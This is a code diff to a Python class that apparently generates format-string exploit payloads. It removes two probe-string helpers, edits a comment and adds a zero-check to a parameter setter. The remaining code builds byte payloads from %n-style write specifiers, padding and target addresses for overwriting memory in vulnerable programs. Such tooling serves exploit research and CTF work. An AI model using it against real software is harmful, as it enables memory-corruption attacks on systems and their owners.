@@ -78,29 +78,6 @@ class DirectFmtGenerator:
 
                 return [self.temp_address + parameters + padding_printed_len, padding_effective_len]
 
-    def generate_fmt_for_find_end(self):
-        writers = ""
-
-        for w in self.writers:
-            writers += w[0] + w[1] + w[2].replace("ln", "p.").replace("hhn", "p..").replace("hn", "p.").replace("n",
-                                                                                                                "p")
-
-        return writers + self.align_padding + self.temp_address * len(self.address)
-
-    def generate_final_fmt(self, shift_for_broken_pattern, input_len):
-        writers = ""
-
-        for w in self.writers:
-            writers += "V" * len(w[0]) + w[1] + w[2].replace("ln", "p.").replace("hhn", "p..").replace("hn",
-                                                                                                       "p.").replace(
-                "n",
-                "p")
-        shift_padding = "C" * shift_for_broken_pattern
-
-        addresses = self.temp_address * len(self.writers)
-
-        return writers + shift_padding + addresses + "C" * (input_len - len(writers + shift_padding + addresses))
-
     def generate_exploit_fmt_in_byte(self, input_len, markers_0, input_type):
         writers = ""
 
@@ -122,7 +99,7 @@ class DirectFmtGenerator:
         writers = ""
 
         for w in self.writers:
-            #writers += "-----" + w[1] + w[2].replace("n", "p")
+            #writers += w[0] + w[1] + w[2].replace("n", "p")
             writers += w[0] + w[1] + w[2]
 
         addresses = b""
@@ -137,7 +114,10 @@ class DirectFmtGenerator:
             return markers_0.encode() + self.align_padding.encode() + addresses + writers.encode() + final_padding.encode(), len(markers_0 + self.align_padding + self.temp_address * len(self.address) + writers + final_padding)
 
     def set_direct_parameter_num(self, num):
-        self.direct_parameter_num = num
+        if num == 0:
+            self.direct_parameter_num = 1
+        else:
+            self.direct_parameter_num = num
 
     def reset_direct_parameter_num(self):
         self.direct_parameter_num = 1
